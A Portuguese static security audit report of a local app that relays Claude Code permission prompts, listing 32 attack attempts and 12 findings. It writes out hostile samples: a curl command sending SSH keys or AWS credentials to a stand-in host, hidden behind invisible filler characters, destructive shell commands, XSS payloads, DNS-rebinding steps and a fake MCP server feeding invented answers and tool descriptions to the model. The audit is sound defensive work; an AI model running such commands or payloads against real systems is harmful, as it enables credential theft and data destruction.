# Fase 5: rodada 1 (auditoria de segurança, critério C10)

- Data: 2026-10-08.
- Revisor: Claude Code (Opus), auditoria independente. Não participou da implementação.
- SHA auditado: `42ecb7f3562584da9e7cd490a8dd741f18584c28` (main). As linhas citadas
  valem para esse SHA. O branch `codex/decision-latency` difere só em testes e docs.
- Método: **estático (leitura de código/teste)**. Nada foi compilado, executado ou
  instalado. Nenhum `cargo`, `npm` ou `node` rodou. O app instalado, o
  `connection.json` e os tokens não foram lidos nem tocados. Nenhuma requisição
  foi feita a 127.0.0.1:7717.
- Limites: todo resultado abaixo é inferência a partir do código e dos testes
  versionados. Quando um teste cobre o ataque, ele é citado como "teste
  existente, não executado nesta rodada". Comportamento de bibliotecas
  (hyper, rmcp, tauri-winrt-notification, WebView2) não foi verificado em execução.
- **Veredito C10: DEVOLVIDO.** Detalhes na última seção.

## 1. Modelo de ameaças

**Ativos.** (1) A decisão humana: allow/deny de `PermissionRequest`, resposta a
`AskUserQuestion`, aprovação de `ExitPlanMode`, resposta de `scribe_ask`.
(2) As chaves: Bearer do MCP, `hook_key` (HMAC) e credencial efêmera de UI.
(3) O conteúdo das sessões: comandos, caminhos, planos, títulos.
(4) A disponibilidade do canal, com queda segura para o terminal.

**Fronteiras de confiança.**

| Fronteira | Quem está do outro lado | Defesa principal |
| --- | --- | --- |
| Socket 127.0.0.1:porta | Outros processos locais, inclusive de outras contas do SO | Host exato, Origin proibido, Bearer, HMAC nos hooks, credencial de UI |
| Navegador → localhost | Página maliciosa (CSRF, DNS rebinding, preflight) | Host exato, qualquer Origin rejeitado, sem CORS, prova HMAC no challenge |
| Payload do hook → UI e notificações | Conteúdo de repositório e do modelo (prompt injection) em `tool_input`, `cwd`, título, plano | Esquemas conhecidos, `ambiguous_text`, redação, React sem HTML, escape de markup |
| Servidor → `scribe-hook` | Impostor na porta (app fechado, porta tomada) | Prova do servidor antes de enviar o corpo; resposta assinada e ligada ao nonce |
| Servidor → cliente MCP do Claude Code | Impostor na porta | **Nenhuma** autenticação do servidor (ver F-01) |
| Webview → Rust (IPC) | Conteúdo remoto ou navegação indevida | Manifesto de comandos, capability da janela `main`, `trusted()`, CSP, foco |
| Disco | Outras contas do SO | 0600/0700 no Unix, DACL protegida só do usuário no Windows |
| Repetição | Quem captura tráfego de loopback | Nonce consumido no POST, prazo de 2 s |

**Fora do escopo declarado** (`docs/seguranca.md`, seção "Limites"): o mesmo
usuário do SO, administrador e harness comprometido. Esta auditoria respeita
esse limite. Outras contas do SO e páginas web continuam no escopo.

## 2. Tentativas de ataque

Formato: ataque concreto, defesa esperada, onde está, teste, resultado.
"Cobertura" diz se um teste automatizado exercita exatamente o cenário.

### C10-A01 · Bearer ausente, errado ou duplicado
- Ataque: `GET /v1/health` e `POST /mcp` sem `Authorization`, com `Bearer wrong`
  ou com dois headers `Authorization`.
- Defesa: 401 antes de qualquer handler; comparação em tempo constante.
- Onde: `server.rs:209-211`, `server.rs:253-263`.
- Teste: `tests/core.rs:1068` (`http_boundaries_auth_body_rate_mcp_and_protected_decision_route`), linhas 1080 e 1089-1094. Teste existente, não executado nesta rodada.
- Resultado: **DEFENDIDO**. Cobertura completa.

### C10-A02 · Bearer válido sem credencial de UI
- Ataque: processo com o Bearer chama `GET /v1/state` ou `POST /v1/decisions/{id}` `{"action":"allow"}`.
- Defesa: 403 sem `x-scribe-ui` único e correto. A credencial de UI só existe na memória do Rust.
- Onde: `server.rs:264-273`, `server.rs:102`, `server.rs:182-185`. A webview resolve por IPC (`desktop.rs:348-365`), não por HTTP.
- Teste: `tests/core.rs:1095-1111` e `tests/core.rs:866-871`. Teste existente, não executado nesta rodada.
- Resultado: **DEFENDIDO**. Cobertura completa.

### C10-A03 · DNS rebinding com Host único estrangeiro
- Ataque: página em `attacker.example` religa o nome para 127.0.0.1 e envia
  `Host: attacker.example:7717` (um único header).
- Defesa: Host deve ser exatamente `127.0.0.1:<porta>` ou `localhost:<porta>`.
- Onde: `server.rs:231-241`; o rmcp repete a checagem em `server.rs:122`.
- Teste: `tests/core.rs:1078-1079` envia o Host estrangeiro **em adição** ao Host
  correto, que `raw_request` sempre inclui (`tests/core.rs:1051`). O teste prova a
  rejeição de Host duplicado, não a de Host único estrangeiro.
- Resultado: **DEFENDIDO** pelo código. Cobertura parcial (ver F-07).

### C10-A04 · URI em forma absoluta com autoridade divergente
- Ataque: `GET http://evil.example:7717/v1/health HTTP/1.1` com `Host: 127.0.0.1:7717`.
- Defesa: a autoridade da URI deve ser igual ao Host.
- Onde: `server.rs:242-246`.
- Teste: sem teste. Nenhuma requisição de teste usa forma absoluta. `docs/seguranca.md` afirma o contrário.
- Resultado: **DEFENDIDO** pelo código. Sem teste (ver F-07).

### C10-A05 · Origin de página, `Origin: null` ou vazio
- Ataque: `fetch("http://127.0.0.1:7717/v1/hooks/PermissionRequest",{method:"POST",mode:"no-cors",body})` a partir de uma página; formulário HTML com `Origin: null`.
- Defesa: qualquer header `Origin`, inclusive vazio, gera 403. Nenhum `Access-Control-Allow-Origin`.
- Onde: `server.rs:238`; `server.rs:123` no MCP.
- Teste: `tests/core.rs:1076-1077` e `1084-1087`. Teste existente, não executado nesta rodada.
- Resultado: **DEFENDIDO**. Cobertura completa.

### C10-A06 · Preflight CORS
- Ataque: `OPTIONS /v1/decisions/x` com `Origin: https://evil.example` e `Access-Control-Request-Method: POST`.
- Defesa: 403 pelo Origin; o roteador não tem camada CORS, então nunca emite cabeçalhos CORS.
- Onde: `server.rs:135-144`, `server.rs:238`.
- Teste: sem teste com `OPTIONS`. O teste de Origin usa `GET`.
- Resultado: **DEFENDIDO** pelo código. Cobertura parcial.

### C10-A07 · Página sem Origin esgotando o balde de challenges
- Ataque: `<img src="http://127.0.0.1:7717/v1/hooks/challenge/<32 hex>">` em laço. GET no-cors não leva Origin.
- Defesa: o challenge exige prova HMAC `challenge-request` antes de reservar slot ou gastar o balde de 256/s.
- Onde: `server.rs:356-373`, `server.rs:377-381`.
- Teste: `tests/core.rs:1651` (`unauthenticated_challenge_flood_cannot_block_a_native_hook`) e `tests/core.rs:1782-1794`. Teste existente, não executado nesta rodada.
- Resultado: **DEFENDIDO**. Fecha o R2-1 da Fase 4.

### C10-A08 · Hook só com Bearer (cartão falso ou cancelamento)
- Ataque: `POST /v1/hooks/PermissionRequest` com Bearer válido e sem nonce/prova; `POST /v1/hooks/PostToolUse` com o `tool_use_id` de um cartão real para cancelá-lo.
- Defesa: todo `POST /v1/hooks/*` exige HMAC; o Bearer não vale ali.
- Onde: `server.rs:249-252`, `server.rs:281-303`.
- Teste: `tests/core.rs:1705` (`bearer_only_hooks_are_rejected_and_challenge_flood_does_not_spend_auth_quota`), linhas 1713-1779. Teste existente, não executado nesta rodada.
- Resultado: **DEFENDIDO**. Cobertura completa.

### C10-A09 · Prova HMAC forjada
- Ataque: POST com prova assinada usando o Bearer como chave; prova `invalid`; prova do servidor refletida como prova do cliente; prova para outro nonce.
- Defesa: HMAC-SHA256 com domínio e campos prefixados por tamanho; verificação em tempo constante.
- Onde: `hook-protocol/src/lib.rs:9-29`; `server.rs:293-303`, `server.rs:359-370`.
- Teste: `tests/core.rs:1574-1596`, `tests/core.rs:1608-1648`, `hook-protocol/src/lib.rs:47-76`. Teste existente, não executado nesta rodada.
- Resultado: **DEFENDIDO**. Cobertura completa.

### C10-A10 · Repetir o mesmo POST assinado logo depois
- Ataque: reenviar o par (nonce, prova, corpo) já aceito.
- Defesa: o nonce sai do mapa no primeiro POST válido; o segundo recebe 401.
- Onde: `server.rs:304-312`.
- Teste: `tests/core.rs:1557-1569`. Teste existente, não executado nesta rodada.
- Resultado: **DEFENDIDO**. Cobertura completa.

### C10-A11 · Repetir um par capturado (GET de challenge + POST)
- Ataque: quem captura o loopback guarda o GET (`x-scribe-proof` de `challenge-request`, N) e o POST (N, prova, corpo). Depois reenvia o GET, que reserva N de novo, e o POST.
- Defesa esperada: o servidor deveria exigir frescor que o cliente não controla.
- Onde: a prova do GET é determinística em N (`hook-client/src/main.rs:361-364`); o servidor aceita reservar de novo um N já consumido (`server.rs:377-381`); o POST não liga nenhum valor escolhido pelo servidor (`server.rs:296-300`).
- Teste: `tests/core.rs:1570-1573` afirma que reservar o mesmo nonce de novo dá 204. Nenhum teste reenvia a prova original depois disso.
- Resultado: **VULNERÁVEL** (baixo). O reenvio injeta eventos antigos: `SessionEnd` encerra a sessão e cancela seus cartões (`lib.rs:385-415`); `PermissionRequest` cria cartão cuja resposta volta ao atacante, não ao Claude Code. Não produz allow para o Claude Code. Exige captura de loopback. É o R2-3 da Fase 4, ainda aberto (ver F-03).

### C10-A12 · Esgotar a quota legítima com tráfego não autenticado
- Ataque: 270 GETs de challenge sem prova e 270 POSTs com prova inválida; depois um hook legítimo.
- Defesa: provas inválidas não reservam slot nem gastam a quota de 50/s, que só é contada após o HMAC.
- Onde: `server.rs:313-315`, `server.rs:341-343`, `server.rs:371`.
- Teste: `tests/core.rs:1651-1702`. Teste existente, não executado nesta rodada.
- Resultado: **DEFENDIDO**. Cobertura completa.

### C10-A13 · Consumo de recursos antes da autenticação
- Ataque: outra conta local abre centenas de conexões e envia `POST /v1/hooks/SessionStart` com 1 MiB cada e prova falsa; ou abre conexões e envia cabeçalhos devagar.
- Defesa esperada: limitar o custo antes do HMAC.
- Onde: o corpo é lido (até 1 MiB, 500 ms) e o HMAC é calculado sobre ele antes de qualquer limite (`server.rs:274-303`). Não há limite de conexões. O timeout de leitura de cabeçalho depende do hyper/axum e não foi verificado.
- Teste: tamanho em `tests/core.rs:1112-1125`; corpo lento em `tests/core.rs:1474-1481`. Sem teste de inundação concorrente nem de cabeçalho lento.
- Resultado: **PARCIAL**. O efeito é só disponibilidade: o hook estoura o tempo e o Claude Code volta ao terminal. Ver F-04.

### C10-A14 · Servidor falso recebendo o conteúdo do hook
- Ataque: com o app fechado, outro processo escuta em 127.0.0.1:7717 e responde ao challenge com 204 sem prova, com prova refletida ou assinada com o Bearer; ou redireciona; ou o ambiente define `HTTP_PROXY`.
- Defesa: o helper só envia o corpo depois de verificar a prova do servidor; sem redirect e sem proxy.
- Onde: `hook-client/src/main.rs:350-380`, `387-392`.
- Teste: `scripts/verification/native-client.test.mjs:78`, cenários `impostor`, `bearer-forgery`, `challenge-reflection`, `redirect` e proxy (linhas 178-211; a linha 211 confirma que nenhum payload chega ao impostor). Teste existente, não executado nesta rodada.
- Resultado: **DEFENDIDO**. Cobertura completa.

### C10-A15 · Servidor falso para o canal MCP
- Ataque: com o app fechado (ou antes de ele subir), outra conta do SO escuta em 127.0.0.1:7717 e fala MCP. O Claude Code conecta em `http://127.0.0.1:${port}/mcp` com `Authorization: Bearer ${token}`.
- Defesa esperada: o cliente deveria autenticar o servidor antes de enviar o Bearer e de confiar nas respostas.
- Onde: `plugins/scribe/.mcp.json:5-7`. Não há prova do servidor no MCP. A ressalva já aparece no R2-2 e no P8 da Fase 4, sem correção.
- Teste: sem teste.
- Resultado: **VULNERÁVEL** (médio). O impostor (1) recebe o Bearer; (2) responde a `scribe_ask` com uma resposta inventada, que o Claude trata como humana; (3) publica ferramentas e descrições próprias ao modelo. Permissões do Claude Code não são concedidas por esse caminho: o hook continua indo ao terminal. Ver F-01.

### C10-A16 · Resposta alterada ou trocada ao helper
- Ataque: servidor que conhece a chave muda evento, status ou corpo; reaproveita a resposta de outro nonce; responde 8193 bytes; altera `questions` ou `plan` no `updatedInput`.
- Defesa: a assinatura cobre nonce, evento, status 200 e corpo exato; o helper reconstrói só saídas suportadas e confere o eco do input original.
- Onde: `hook-client/src/main.rs:411-451`, `243-327`.
- Teste: `native-client.test.mjs:78` (cenários `replay`, `wrong-event`, `wrong-status`, `changed-body`, `altered-questions`, `altered-plan`), `native-client.test.mjs:370`, `hook-client/src/main.rs:604`. Teste existente, não executado nesta rodada.
- Resultado: **DEFENDIDO**. Cobertura completa.

### C10-A17 · Corpo grande e JSON bomba
- Ataque: corpo de 1 MiB + 1; stdin sem fim; JSON com 100 mil `[` aninhados no hook e no stdin do helper.
- Defesa: limite de 1 MiB no servidor e no helper; 500 ms no servidor, 250 ms no stdin; o limite padrão de recursão do `serde_json` (128) rejeita aninhamento profundo.
- Onde: `server.rs:30`, `server.rs:274-280`; `hook-client/src/main.rs:28`, `73-84`.
- Teste: tamanho e stdin em `tests/core.rs:1112-1125` e `native-client.test.mjs:303`. Sem teste de aninhamento profundo.
- Resultado: **DEFENDIDO**. A defesa de profundidade vem da biblioteca; cobertura parcial.

### C10-A18 · XSS e markup na UI React
- Ataque: `cwd` = `/tmp/<img src=x onerror=alert(1)>`, `session_title` com `<script>`, plano com HTML e link Markdown, `tool_input.command` com `</pre><svg onload=...>`.
- Defesa: React escapa texto; não há `dangerouslySetInnerHTML`, `innerHTML` nem `eval` em `app/ui/src`; CSP `script-src 'self'`.
- Onde: `DecisionCard.tsx:235-255`, `DecisionCard.tsx:386`; `tauri.conf.json:16`.
- Teste: `DecisionCard.test.tsx:65` e `:840`; `test/e2e/window.spec.ts:128` (plano). Sem teste para projeto, título e alvo de permissão.
- Resultado: **DEFENDIDO**. Cobertura parcial. `style-src 'unsafe-inline'` permanece, sem impacto enquanto não houver injeção de HTML.

### C10-A19 · Controle, bidi e sequências de escape nas notificações
- Ataque: diretório do projeto ou título com `\x1b]0;...\x07`, `U+202E` ou `<b>`.
- Defesa: rótulo com Cc/Cf vira "Scribe"; corpo sem comando, caminho, pergunta ou plano; no Linux, `& < >` são escapados.
- Onde: `notifications.rs:62-72`, `notifications.rs:83-87`, `desktop.rs:519-524`; títulos com Cc/Cf são descartados em `model.rs:161-169`.
- Teste: `notifications.rs:179-198` (bidi e escape), `notifications.rs:135-177`; `tests/session_title.rs:69`. Teste existente, não executado nesta rodada.
- Resultado: **DEFENDIDO**. Cobertura completa.

### C10-A20 · Injeção de XML no toast do Windows
- Ataque: título de sessão `a</text><action content="x" arguments="y"/><text>` ou diretório `a&b`. `&` é válido em nome de pasta no Windows.
- Defesa esperada: escapar XML antes de montar o toast.
- Onde: o Scribe não escapa no Windows (`desktop.rs:519-524` só cobre Linux). A segurança depende do `tauri-winrt-notification 0.8.1` (`Cargo.lock:4038`).
- Teste: sem teste.
- Resultado: **NÃO VERIFICADO**. Mesmo no pior caso, a ativação só abre o cartão (`desktop.rs:539-561`); não há ação de decisão no toast.

### C10-A21 · Permitir ação de risco sem armar, antes de 1 s ou com outra opção
- Ataque: IPC `resolve_decision(id,{"action":"allow"})` num `sudo ...`; `arm` e `allow` no mesmo ms; `arm` com `option:0` e `allow` com `option:1`.
- Defesa: risco ou atualização de permissão exigem `arm` e um segundo pedido após 1 s, com a mesma escolha.
- Onde: `decisions.rs:410-433`, `decisions.rs:463-491`.
- Teste: `tests/decisions.rs:338` (`risky_permission_requires_separate_arm_and_confirmation_and_sanitizes_storage`), `tests/decisions.rs:122`, `tests/decisions.rs:34`. Teste existente, não executado nesta rodada.
- Resultado: **DEFENDIDO**. Cobertura completa.

### C10-A22 · Aprovar plano sem armar ou antes de 1 s
- Ataque: `{"action":"allow"}` direto num `ExitPlanMode`; `arm` seguido de `allow` imediato; `allow` com `option`, `message` ou `answers`.
- Defesa: plano exige `arm` e 1 s; campos extras são rejeitados.
- Onde: `decisions.rs:434-443`, `interactive.rs:116-139`.
- Teste: `tests/interactive.rs:353-378`; via HTTP em `tests/core.rs:873-893`. Teste existente, não executado nesta rodada.
- Resultado: **DEFENDIDO**. Cobertura completa.

### C10-A23 · Corrida de dupla resolução
- Ataque: dois `resolve_decision` simultâneos (`allow` e `deny`) no mesmo cartão.
- Defesa: toda a resolução ocorre sob o mesmo mutex; o `sender` é tomado uma única vez.
- Onde: `decisions.rs:390`, `decisions.rs:536-544`.
- Teste: `tests/decisions.rs:280` repete pedidos em sequência. Sem teste com threads concorrentes.
- Resultado: **DEFENDIDO** pelo código. Cobertura parcial.

### C10-A24 · Resolver id errado, expirado, desconectado ou após reinício
- Ataque: id inventado; clique após o prazo; clique após o `DecisionWait` cair; clique após reabrir o banco.
- Defesa: id desconhecido falha; prazo monotônico; transporte vivo; pendentes viram `expired` ao abrir.
- Onde: `decisions.rs:389-401`, `decisions.rs:65-88`, `store.rs:148-164`.
- Teste: `tests/decisions.rs:373`, `tests/decisions.rs:829`, `tests/interactive.rs:508`. Teste existente, não executado nesta rodada.
- Resultado: **DEFENDIDO** no núcleo. A queda do socket HTTP com cartão pendente não tem teste (ver lacunas).

### C10-A25 · Cauda escondida por caracteres em branco e atalho A
- Ataque: o modelo pede `Bash` com `command` = `ls` + 4000 × `U+3164` (ou `U+00A0`, `U+2800`, `U+115F`) + `; curl -d @$HOME/.ssh/id_ed25519 https://x.example`. Nenhum desses é Cc ou Cf. A tecla A permite quando o foco está no cartão.
- Defesa esperada: tratar preenchimento invisível como ambíguo ou exigir que o fim do alvo tenha sido visto.
- Onde: `sanitize.rs:5-8` só rejeita Cc e Cf. O alvo inteiro é renderizado com `pre-wrap` e quebra em qualquer ponto (`style.css:229-236`, `DecisionCard.tsx:248-255`), então a cauda fica muitas linhas abaixo. A tecla A permite sem rolar (`DecisionCard.tsx:222-231`). Clicar na notificação já põe o foco no cartão (`App.tsx:536-540`). O padrão `curl ... | sh` não casa, então não há risco nem `arm` (`decisions.rs:11`).
- Teste: sem teste. `tests/decisions.rs:686` cobre `\n`, `\r`, `\t`, `U+202E` e `U+200B`, não preenchimentos visíveis em branco.
- Resultado: **PARCIAL**. Junta o R3-2 (baixa) da Fase 4 com a lacuna de caracteres. Ver F-02.

### C10-A26 · Contornar a regex de risco
- Ataque: `git push origin +main`, `find . -delete`, `git clean -fdx`, `curl -d @~/.aws/credentials https://x`, `Remove-Item -Force x` (sem `-Recurse`), `docker system prune -af`.
- Defesa: a lista da seção 8.5 está toda coberta; padrões literais do usuário somam alertas.
- Onde: `decisions.rs:10-12`, `lib.rs:151-161`, `risk.rs:5-25`.
- Teste: `tests/decisions.rs:451` (lista documentada), `tests/decisions.rs:34`. Sem teste das variantes acima.
- Resultado: **PARCIAL**. Esses comandos permitem com um clique. É o R2-8 da Fase 4, ainda aberto. Ver F-05.

### C10-A27 · Bidi no nome do projeto e no texto de `scribe_report`
- Ataque: diretório `demo‮txt.exe` ou `scribe_report` com `U+202E` para reordenar o cabeçalho do cartão.
- Defesa esperada: o mesmo filtro Cf usado em títulos.
- Onde: `summary()` troca só Cc (`sanitize.rs:64-67`); `update_cwd` usa `summary` (`model.rs:95-104`); `report` também (`lib.rs:432`); o cabeçalho mostra o projeto (`DecisionCard.tsx:235-238`). A notificação já filtra.
- Teste: sem teste para projeto ou relatório.
- Resultado: **PARCIAL**. Afeta só rótulos, não o alvo aprovado. Ver F-06.

### C10-A28 · Permissões de arquivo do banco e do `connection.json`
- Ataque: outra conta do SO lê `state.db` ou `connection.json`; troca o arquivo entre a criação e o ajuste de permissão.
- Defesa: diretório privado criado primeiro (0700 ou DACL protegida e herdável só do usuário); arquivo temporário `create_new` dentro dele; 0600; rename atômico.
- Onde: `private_fs.rs:12-19`, `private_fs.rs:21-107` (`D:P(A;OICI;FA;;;<SID>)` em 75-76); `desktop.rs:144-167`; `store.rs:10-24`.
- Teste: `tests/core.rs:524` (`storage_is_restricted_to_the_current_os_user`, banco); `desktop.rs:1268` (atomicidade, sem ACL). Sem teste de ACL do `connection.json` pelo caminho `write_private`.
- Resultado: **DEFENDIDO**. Cobertura parcial. Observação: `SCRIBE_CONNECTION_FILE` e `SCRIBE_DATA_DIR` valem no binário de release (`hook-client/src/main.rs:41-52`, `desktop.rs:179-181`, `233-235`) e o helper não confere dono nem ACL do arquivo. Ver F-08.

### C10-A29 · Retenção e exclusão do histórico
- Ataque: procurar comandos e planos antigos no `state.db` depois de "Apagar histórico" ou após a retenção.
- Defesa: `PRAGMA secure_delete = ON`; poda por retenção em cada hook e a cada 60 s sem UI; `VACUUM` ao apagar; pendentes recebem `scribe_unavailable`.
- Onde: `store.rs:28`, `store.rs:77-110`, `store.rs:136-140`; `lib.rs:45-50`, `lib.rs:503-520`; `server.rs:156-166`.
- Teste: `tests/core.rs:153`, `tests/core.rs:252`, `tests/core.rs:651` (só confere estado lógico após `clear_history`), `tests/decisions.rs:429`.
- Resultado: **DEFENDIDO**. Cobertura parcial: nenhum teste varre os bytes do arquivo depois de apagar ou podar. Remanência em SSD e no journal apagado está fora do alcance do app. Ver F-12.

### C10-A30 · Superfície IPC do Tauri
- Ataque: conteúdo navegado para `https://example.com` ou uma janela nova tenta `invoke("resolve_decision")`; conteúdo local chama `resolve_decision` com a janela fora de foco.
- Defesa: manifesto de comandos (`build.rs:3-14`); capability só para a janela `main` e oito comandos (`capabilities/main.json`); `trusted()` em todo comando (`desktop.rs:290-306`); navegação e janelas novas bloqueadas (`desktop.rs:965-968`); `resolve_decision` exige foco (`desktop.rs:356-358`); `open_help` abre uma URL fixa (`desktop.rs:307-315`); CSP sem `connect-src` HTTP (`tauri.conf.json:16`).
- Teste: `desktop.rs:1145` (`only_local_asset_origins_can_navigate_or_invoke`). Teste existente, não executado nesta rodada.
- Resultado: **DEFENDIDO**. Cobertura completa para origem; a capability não tem teste de snapshot.

### C10-A31 · MCP: autenticação, resolução e sessão
- Ataque: `tools/call scribe_ask` sem Bearer; chamada com Bearer tentando resolver um cartão; `scribe_report` com `session_id` de outra sessão viva.
- Defesa: Bearer obrigatório; o MCP não tem rota de resolução; argumentos limitados.
- Onde: `server.rs:142`, `server.rs:257-263`; `mcp.rs:52-112`; `decisions.rs:211-239`.
- Teste: `tests/core.rs:1145-1279`. Teste existente, não executado nesta rodada.
- Resultado: **PARCIAL**. Autenticação e resolução estão defendidas. A identidade por sessão não existe: quem tem o Bearer nomeia qualquer sessão. A limitação está documentada em `docs/seguranca.md`. Ver F-11.

### C10-A32 · Auditoria de dependências
- Ataque: dependência com aviso conhecido na árvore entregue.
- Defesa: lockfiles, `cargo audit --deny warnings`, `npm audit --audit-level=low` em `app` e `docs-site`, actions fixadas por SHA.
- Onde: `.github/workflows/ci.yml:11-28`, `.github/workflows/docs.yml:30`, `.github/dependabot.yml:1-14`.
- Teste: job `dependency-audit` do CI. Não executado nesta rodada.
- Resultado: **PARCIAL**. Duas exceções: RUSTSEC-2024-0370 (proc-macro-error, sem manutenção) e **RUSTSEC-2024-0429 (glib 0.18.5), que não está corrigido**. A justificativa de não alcance é inferência estática, como a própria `docs/dependencias-desktop.md` diz. O Dependabot não cobre npm. Ver F-09 e F-10.

## 3. Contagem

| Resultado | Quantidade | IDs |
| --- | --- | --- |
| DEFENDIDO | 23 | A01-A10, A12, A14, A16-A19, A21-A24, A28-A30 |
| PARCIAL | 6 | A13, A25, A26, A27, A31, A32 |
| VULNERÁVEL | 2 | A11, A15 |
| NÃO VERIFICADO | 1 | A20 |

Dos 23 defendidos, 15 têm teste automatizado que exercita exatamente o cenário
(A01, A02, A05, A07, A08, A09, A10, A12, A14, A16, A19, A21, A22, A24, A30).
Oito têm cobertura parcial ou nenhuma (A03, A04, A06, A17, A18, A23, A28, A29).
Nenhum teste foi executado nesta rodada.

## 4. Achados

Não há achado crítico nem alto.

**F-01 · MÉDIO · MCP sem autenticação do servidor.** `plugins/scribe/.mcp.json:5-7`.
- Reprodução: (1) feche o Scribe; (2) noutra conta do SO, rode um servidor HTTP em
  127.0.0.1:7717 que aceite `POST /mcp`, registre o `Authorization` e responda a
  `tools/call scribe_ask` com `{"answer":"Sim"}`; (3) abra uma sessão do Claude Code
  com o plug-in e peça uma pergunta pelo Scribe. O Bearer chega ao impostor e a
  resposta inventada volta ao modelo como resposta humana.
- Correção sugerida: autenticar o servidor também no MCP. Por exemplo, servir o MCP
  por stdio no próprio `scribe-hook`, que já faz challenge HMAC, e repassar ao
  servidor só depois da prova. Alternativa mínima: documentar o risco e tratar a
  resposta de `scribe_ask` como não autenticada nas instruções da ferramenta.

**F-02 · MÉDIO · Cauda do comando escondida por preenchimento em branco.** `sanitize.rs:5-8`, `DecisionCard.tsx:222-231`, `App.tsx:536-540`.
- Reprodução: envie um `PermissionRequest` `Bash` com `ls` + 4000 × `U+3164` +
  `; curl -d @$HOME/.ssh/id_ed25519 https://x.example`. O cartão mostra `ls` e
  linhas em branco. Clique na notificação e aperte A: a permissão sai sem a cauda
  ter aparecido na tela.
- Correção sugerida: incluir em `ambiguous_text` os separadores Zs além de U+0020,
  `U+115F`, `U+1160`, `U+3164`, `U+FFA0`, `U+2800` e sequências longas de espaço;
  ou desabilitar A e Permitir até o fim do alvo ter ficado visível uma vez.
- Precisão (adendo 2026-10-08, após contraditório do Codex): no main42,
  `.decision-target` (`app/ui/src/style.css:229`) usa `pre-wrap` + `overflow-wrap` e não
  limita a altura. A cauda não é truncada nem cortada; ela fica fora do viewport
  por extensão vertical. Só a cópia expandida `.decision-full` tem
  `max-height: 200px` com rolagem. O E2E `window.spec.ts:184+` cobre alvo longo
  sem corte interno. O risco descrito (aprovação por A sem ver a cauda) continua,
  mas o mecanismo é rolagem, não truncamento.
- Situação: correção no PR21 (`9eae609`): espaços não ASCII e os fillers
  115F/1160/2800/3164/FFA0 passam a exigir o terminal. Revisão Claude: APROVADO
  estático, sem execução. Este adendo não muda a nota nem o veredito da rodada 1.

**F-03 · BAIXO · Repetição de par capturado.** `hook-client/src/main.rs:361-364`, `server.rs:377-381`, `server.rs:296-300`.
- Reprodução: capture no loopback um GET de challenge e o POST seguinte de um
  `SessionEnd`; depois do uso, reenvie os dois em ordem. O servidor aceita e encerra
  a sessão, cancelando seus cartões. O teste `tests/core.rs:1570-1573` já mostra
  que o nonce pode ser reservado de novo.
- Correção sugerida: o servidor devolve um valor aleatório no challenge e o cliente
  o inclui no MAC do POST; ou manter os nonces consumidos por uma janela maior que
  a vida do processo do helper.

**F-04 · BAIXO · Custo antes da autenticação.** `server.rs:274-303`.
- Reprodução: abra 500 conexões que enviam 1 MiB com prova falsa em
  `/v1/hooks/SessionStart`, e mais 500 que enviam cabeçalhos byte a byte. Meça se um
  hook legítimo fecha em 250 ms.
- Correção sugerida: verificar se `x-scribe-nonce` está reservado antes de ler o
  corpo (o atacante sem chave não reserva nonce), limitar conexões simultâneas e
  fixar um timeout de leitura de cabeçalho.

**F-05 · BAIXO · Lacunas da regex de risco.** `decisions.rs:10-12`.
- Reprodução: `git push origin +main`, `find . -delete`, `git clean -fdx` e
  `curl -d @arquivo URL` chegam com `risk=false` e permitem com um clique ou com A.
- Correção sugerida: acrescentar refspec com `+`, `-delete`, `git clean -f`,
  `curl/wget` com `-d @`, `-T`, `--data-binary @`, `Remove-Item -Force`. Manter a
  regex como alerta, não como barreira.

**F-06 · BAIXO · Cf em rótulos de projeto e de relatório.** `sanitize.rs:64-67`, `model.rs:95-104`, `lib.rs:432`.
- Reprodução: abra uma sessão em `.../demo‮txt.exe` ou chame `scribe_report`
  com `U+202E`. O cabeçalho do cartão e a ação da sessão aparecem reordenados.
- Correção sugerida: aplicar `ambiguous_text` a `project` e ao texto de relatório,
  com o mesmo fallback dos títulos.

**F-07 · BAIXO · Documento promete cobertura que o teste não tem.** `docs/seguranca.md:59` e `tests/core.rs:1051`, `1075-1088`.
- Reprodução: leia o teste. `raw_request` sempre envia o Host correto, então as
  linhas 1078-1079 testam Host duplicado. Não há requisição em forma absoluta nem
  `OPTIONS`.
- Correção sugerida: acrescentar casos com Host único estrangeiro, URI absoluta
  divergente e preflight `OPTIONS`, em todas as rotas, inclusive `/mcp` e challenge.

**F-08 · BAIXO · Variáveis de ambiente redefinem a raiz de confiança em release.** `hook-client/src/main.rs:41-52`, `main.rs:455-495`, `desktop.rs:179-181`, `233-235`.
- Reprodução: com `SCRIBE_CONNECTION_FILE` apontando para um JSON controlado, o
  helper usa a porta, a chave e o `app_path` desse arquivo; `--open` executa o
  `app_path`. Exige controle do ambiente do Claude Code, que já dá execução de
  código. Por isso a severidade é baixa.
- Correção sugerida: aceitar as variáveis só em build de teste, ou exigir que o
  arquivo tenha dono e ACL do usuário atual.

**F-09 · BAIXO · Dependabot sem npm.** `.github/dependabot.yml:1-14`.
- Reprodução: o arquivo lista só `cargo` (dois diretórios) e `github-actions`.
  A seção 8.6 pede Dependabot ativo; `app/` e `docs-site/` não recebem atualizações.
- Correção sugerida: adicionar `npm` para `/app` e `/docs-site`.

**F-10 · BAIXO · Risco residual aceito, não corrigido: GTK no Linux.** `ci.yml:28`, `docs/dependencias-desktop.md`.
- RUSTSEC-2024-0429 (glib 0.18.5) permanece. A exceção depende de inferência
  estática de não alcance de `VariantStrIter`. RUSTSEC-2024-0370 é aviso de
  manutenção em macro de build. Não afeta o binário do Windows.
- Correção sugerida: manter a exceção com data de revisão e trocar quando o Tauri
  estável aceitar glib >= 0.20.

**F-11 · BAIXO · Sessão do MCP não isolada.** `mcp.rs:59-67`, `mcp.rs:87-104`.
- Reprodução: com o Bearer, chame `scribe_report` ou `scribe_ask` com o
  `session_id` de outra sessão viva. A ação ou a pergunta aparece nela.
- Correção sugerida: ligar a sessão MCP a uma credencial por sessão. Já documentado.

**F-12 · BAIXO · Retenção sem prova em bytes.** `store.rs:136-140`, `tests/core.rs:698-706`.
- Reprodução: grave um cartão com `echo PUBLIC_MARKER`, apague o histórico e procure
  o marcador nos bytes de `state.db` e de `state.db-journal`. Nenhum teste faz isso.
  No Windows, o banco fica em `%APPDATA%` (perfil roaming) via `app_data_dir`;
  em domínio com perfil roaming, ele sai da máquina.
- Correção sugerida: teste de varredura de bytes após `clear_history` e após poda;
  considerar `app_local_data_dir` no Windows.

Itens da Fase 4 conferidos: R2-1 fechado (A07). R2-3, R2-8 e R3-2 seguem abertos
(A11, A26, A25). R2-2 está fechado para hooks e aberto para o MCP (A15).

## 5. Lacunas e verificações executáveis necessárias

